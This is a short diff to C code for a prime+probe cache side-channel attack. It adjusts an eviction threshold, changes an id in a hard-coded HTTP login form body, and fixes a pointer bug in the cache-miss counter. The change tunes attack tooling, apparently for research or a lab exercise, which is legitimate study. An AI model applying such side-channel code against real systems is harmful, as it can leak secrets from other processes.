@@ -21,7 +21,7 @@
 
 // prime+probe
 #define ATTACK_RUNS 10000
-#define EVICTION_THRESHOLD 400
+#define EVICTION_THRESHOLD 7000
 #define CACHE_STRIDE 4096
 #define PROBE_SIZE (256 * 1024 * 1024) // 256mb
 #define PAGE_COUNT (PROBE_SIZE / HUGE_PAGE_SIZE)
@@ -60,7 +60,7 @@ int main(int argc, char* argv[]) {
     "Content-Type: application/x-www-form-urlencoded\r\n"
     "Connection: keep-alive\r\n"
     "\r\n"
-    "username=none&password=none&id=4132";
+    "username=none&password=none&id=0000";
     char attack_data[256];
     get_inputs(attack_data, argc, argv);
     
@@ -198,7 +198,7 @@ void check_cache_presence(node_t *base_ptr, int *result){
     _mm_lfence();
 
     if (t2 - t1 > c_threshold){ // if miss detected
-        result ++;
+        (*result)++;
     }
 }
 
